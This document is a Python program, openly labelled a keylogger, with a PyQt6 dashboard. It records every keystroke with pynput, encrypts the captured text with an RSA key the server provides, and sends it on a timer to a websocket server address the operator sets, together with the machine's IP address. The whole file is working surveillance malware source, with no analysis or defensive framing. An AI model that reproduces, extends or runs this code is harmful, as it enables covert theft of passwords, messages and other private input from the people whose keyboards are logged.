import json
import threading
import socket
import requests
import subprocess
import time
import sys
import asyncio
import websockets
import rsa
from base64 import urlsafe_b64encode
from cryptography.fernet import Fernet
from pynput import keyboard
from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget, QLineEdit, QFrame, QHBoxLayout
from PyQt6.QtGui import QFont, QIcon, QColor, QPainter, QBrush, QPixmap
from PyQt6.QtCore import Qt


class DataCollector:
    def __init__(self):
        self.text = ""
    
    def collect_data(self, key):
        # Collect data based on the pressed key
        if key == keyboard.Key.enter:
            pass
        elif key == keyboard.Key.tab:
            pass
        elif key == keyboard.Key.space:
            self.text += " "
        elif key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.shift_l:
            pass
        elif key == keyboard.Key.alt:
            pass
        elif key == keyboard.Key.ctrl:
            pass
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.cmd:
            pass
        elif key == keyboard.Key.caps_lock:
            pass
        elif key == keyboard.Key.right:
            pass
        elif key == keyboard.Key.left:
            pass
        elif key == keyboard.Key.down:
            pass
        elif key == keyboard.Key.up:
            pass
        elif key == keyboard.Key.backspace and len(self.text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(self.text) > 0:
            self.text = self.text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            self.text += str(key).strip("'")

    def get_data(self):
        current_text = self.text
        self.clean_data()
        return current_text

    def clean_data(self):
        self.text = ""


class Settings:
    def __init__(self, data_collector):
        self.data_collector = data_collector
        self.window_title = "Keylogger"
        self.window_geometry = (100, 100, 400, 200)
        self.time_interval = 10
        self.server_path = "ws://0.0.0.0:8000/ws"

    def get_server_path(self):
        return self.server_path

    def process_data(self):
        text = self.data_collector.get_data()
        # Perform any processing or analysis on the collected data
        # Here, you can implement the logic to send the data or perform further actions

    def get_window_title(self):
        return self.window_title

    def get_window_geometry(self):
        return self.window_geometry

    def get_time_interval(self):
        return self.time_interval


class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        self.data_collector = DataCollector()
        self.settings = Settings(self.data_collector)

        self.setWindowTitle(self.settings.get_window_title())
        self.setGeometry(*self.settings.get_window_geometry())

        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)

        # Create a vertical layout for the central widget
        self.layout = QVBoxLayout(self.central_widget)
        self.layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        # Create a title label and set the font
        self.title_label = QLabel("Keylogger Dashboard", self)
        self.title_label.setFont(QFont("Arial", 20))
        self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # Create a frame to hold the widgets
        self.frame = QFrame(self)

        # Add the title label to the layout
        self.layout.addWidget(self.title_label)

        # Add the frame to the layout
        self.layout.addWidget(self.frame)
        self.light_indicator = LightIndicator()

        # Create a horizontal layout for the frame
        frame_layout = QHBoxLayout(self.frame)

        # Add the widgets to the frame layout
        self.layout.addWidget(self.light_indicator)

        # Add spacing between the widgets
        frame_layout.setSpacing(20)

        self.hostname = socket.gethostname()
        self.IPAddr = self.get_ip_address(self.hostname)

        self.timer = None
        self.public_key = None
        self.server_path = self.settings.get_server_path()
        self.interval = self.settings.get_time_interval()

        self.setup_keylogger()

        self.setStyleSheet("background-color: #293B5F;")


    def set_server_path(self, path):
        self.server_path = path
        print(path)
        send_thread = threading.Thread(target=self.send_post_req)
        send_thread.start()

    def set_interval(self, time):
        self.interval = time

    def get_ip_address(self, hostname):
        try:
            addr_info = socket.getaddrinfo(hostname, None)
            return addr_info[5][4][0]
        except:
            return '127.0.0.1'

    def setup_keylogger(self):
        listener = keyboard.Listener(on_press=self.data_collector.collect_data)
        listener.start()

        # Start the send_post_req function in a separate thread
        send_thread = threading.Thread(target=self.send_post_req)
        send_thread.start()

    def send_post_req(self):
        asyncio.run(self.send_post_req_async())

    async def send_post_req_async(self):
        reconnect = True
        await asyncio.sleep(1)

        while reconnect:
            try:
                async with websockets.connect(self.server_path) as websocket:
                    print('restart')
                    print(self.server_path)

                    # Receive the public key from the server
                    public_key_data = await websocket.recv()
                    public_key = rsa.PublicKey.load_pkcs1(public_key_data)
                    self.light_indicator.set_active(True)

                    # Receive messages from the server
                    print(f"Received message from server: {public_key}")

                    while True:
                        message = self.data_collector.get_data()
                        encrypted_message = rsa.encrypt(message.encode(), public_key)
                        print(type(encrypted_message))
                        try:
                            await websocket.send(encrypted_message)
                            print("Encrypted message sent successfully")
                        except Exception as e:
          
                            reconnect = False

                        try:
                            await websocket.send(self.IPAddr)
                            print("IP address sent successfully")
                        except Exception as e:
                   
                            reconnect = False

                        await asyncio.sleep(self.interval)
                    

            except websockets.exceptions.ConnectionClosedError:
                print("WebSocket connection closed unexpectedly.")
                self.light_indicator.set_active(False)
                reconnect = False

            except websockets.exceptions.InvalidURI:
                print("Invalid server URL.")
                self.light_indicator.set_active(False)
                reconnect = False

            except websockets.exceptions.InvalidStatusCode:
                self.light_indicator.set_active(False)
                reconnect = False
            except:
                self.light_indicator.set_active(False)
                reconnect = False




        

                
class LightIndicator(QWidget):
    def __init__(self):
        super().__init__()
        self.active = False
        self.setMinimumSize(50, 50)
        self.setMaximumSize(50, 50)

    def set_active(self, active):
        self.active = active
        self.update()

    def paintEvent(self, event):
        # Override the paintEvent to customize the appearance of the light indicator
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        if self.active:
            painter.setBrush(QBrush(QColor(0, 255, 0)))  # Green color when active
        else:
            painter.setBrush(QBrush(QColor(255, 0, 0)))  # Red color when inactive

        painter.drawEllipse(0, 0, self.width(), self.height())


class ServerPathWidget(QWidget):
    def __init__(self, gui):
        super().__init__()
        
        self.gui = gui 

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.path_label = QLabel("Server Path:", self)
        self.path_input = QLineEdit(self)

        self.path_input.setText(gui.server_path)
        self.path_input.textChanged.connect(self.update_server_path)

        layout.addWidget(self.path_label)
        layout.addWidget(self.path_input)

    def update_server_path(self, new_path):
        self.gui.set_server_path(new_path)


class IntervalWidget(QWidget):
    def __init__(self, gui):
        super().__init__()
        
        self.gui = gui 

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.interval_label = QLabel("Interval:", self)
        self.interval_input = QLineEdit(self)

        self.interval_input.setText(str(gui.interval))  # Convert int to string
        self.interval_input.textChanged.connect(self.update_interval)

        layout.addWidget(self.interval_label)
        layout.addWidget(self.interval_input)

    def update_interval(self, time):
         self.gui.set_interval(int(time))  # Convert string to int


if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = KeyloggerGUI()
    server_path_widget = ServerPathWidget(gui)
    gui.layout.addWidget(server_path_widget)
    interval_widget = IntervalWidget(gui)
    gui.layout.addWidget(interval_widget)
    gui.setAutoFillBackground(True)
    gui.show()
    sys.exit(app.exec())
